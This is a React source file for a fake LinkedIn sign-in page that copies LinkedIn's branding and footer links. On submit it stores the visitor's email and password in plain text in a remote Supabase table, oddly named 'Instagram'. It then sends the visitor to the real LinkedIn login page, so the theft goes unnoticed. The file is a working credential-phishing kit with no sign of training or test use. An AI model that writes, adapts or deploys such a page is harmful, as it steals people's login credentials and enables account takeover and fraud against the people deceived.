import React, { useState } from "react";
import "./LinkedInLogin.css";
import { supabase } from "../../supabase";
import { FaApple } from "react-icons/fa";

const LinkedInLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [keepLogged, setKeepLogged] = useState(false);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://www.linkedin.com/login";
    }
  };

  return (
    <div className="linkedin-login-container">
      <div className="linkedin-login-box">
        <div className="linkedin-logo">in</div>
        <h2>Sign in</h2>
        <div className="linkedin-login-alt">
          <button
            type="button"
            onClick={() =>
              (window.location.href =
                "https://appleid.apple.com/auth/authorize")
            }
          >
            <FaApple /> Sign in with Apple
          </button>
        </div>
        <div className="linkedin-login-divider">
          <div className="line" />
          <div className="or">or</div>
          <div className="line" />
        </div>
        <form className="linkedin-login-form" onSubmit={handleSubmit}>
          <label className="linkedin-login-label">Email or phone</label>
          <input
            type="text"
            className="linkedin-login-input"
            placeholder="Email or phone"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <label className="linkedin-login-label">Password</label>
          <div style={{ display: "flex", alignItems: "center" }}>
            <input
              type={showPassword ? "text" : "password"}
              className="linkedin-login-input"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              style={{ flex: 1 }}
            />
            <span
              className="linkedin-login-show"
              onClick={() => setShowPassword((s) => !s)}
            >
              {showPassword ? "Hide" : "Show"}
            </span>
          </div>
          <a
            className="linkedin-login-forgot"
            href="https://www.linkedin.com/uas/request-password-reset"
            target="_blank"
            rel="noopener noreferrer"
          >
            Forgot password?
          </a>
          <div className="linkedin-login-keep">
            <input
              type="checkbox"
              checked={keepLogged}
              onChange={(e) => setKeepLogged(e.target.checked)}
              id="keepLogged"
            />
            <label htmlFor="keepLogged">Keep me logged in</label>
          </div>
          <button type="submit" disabled={loading}>
            {loading ? "Signing in..." : "Sign in"}
          </button>
        </form>
        {success && <div className="linkedin-success">Login saved!</div>}
        {error && <div className="linkedin-error">{error}</div>}
        <div className="linkedin-login-signup">
          New to LinkedIn?
          <a
            href="https://www.linkedin.com/signup"
            target="_blank"
            rel="noopener noreferrer"
          >
            Join now
          </a>
        </div>
        <div className="linkedin-login-footer">
          LinkedIn© 2025
          <br />
          <a
            href="https://www.linkedin.com/legal/user-agreement"
            target="_blank"
            rel="noopener noreferrer"
          >
            User Agreement
          </a>{" "}
          ·
          <a
            href="https://www.linkedin.com/legal/privacy-policy"
            target="_blank"
            rel="noopener noreferrer"
          >
            Privacy Policy
          </a>{" "}
          ·
          <a
            href="https://www.linkedin.com/legal/professional-community-policies"
            target="_blank"
            rel="noopener noreferrer"
          >
            Community Guidelines
          </a>{" "}
          ·
          <a
            href="https://www.linkedin.com/legal/cookie-policy"
            target="_blank"
            rel="noopener noreferrer"
          >
            Cookie Policy
          </a>{" "}
          ·
          <a
            href="https://www.linkedin.com/legal/copyright-policy"
            target="_blank"
            rel="noopener noreferrer"
          >
            Copyright Policy
          </a>{" "}
          ·
          <a
            href="https://www.linkedin.com/help/linkedin/ask/TS-RFEEDBACK"
            target="_blank"
            rel="noopener noreferrer"
          >
            Send Feedback
          </a>{" "}
          ·
          <a href="#">Language</a>
        </div>
      </div>
    </div>
  );
};

export default LinkedInLogin;
